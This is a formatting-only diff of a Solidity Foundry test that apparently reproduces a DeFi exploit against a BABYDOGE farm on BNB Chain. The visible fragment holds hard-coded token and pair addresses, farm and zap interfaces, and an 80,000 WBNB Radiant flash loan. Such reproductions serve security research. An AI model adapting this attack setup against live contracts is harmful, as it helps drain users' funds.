@@ -19,20 +19,25 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IFarm {
+
     function depositOnBehalf(uint256 amount, address account) external;
     function stakeToken() external returns (address);
+
 }
 
 interface IFarmZAP {
+
     function buyTokensAndDepositOnBehalf(
         IFarm farm,
         uint256 amountIn,
         uint256 amountOutMin,
         address[] calldata path
     ) external payable returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
@@ -57,7 +62,7 @@ contract ContractTest is Test {
         assets[0] = address(WBNB);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 80_000 * 1e18;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);
 
@@ -127,4 +132,5 @@ contract ContractTest is Test {
             return address(WBNB);
         }
     }
+
 }
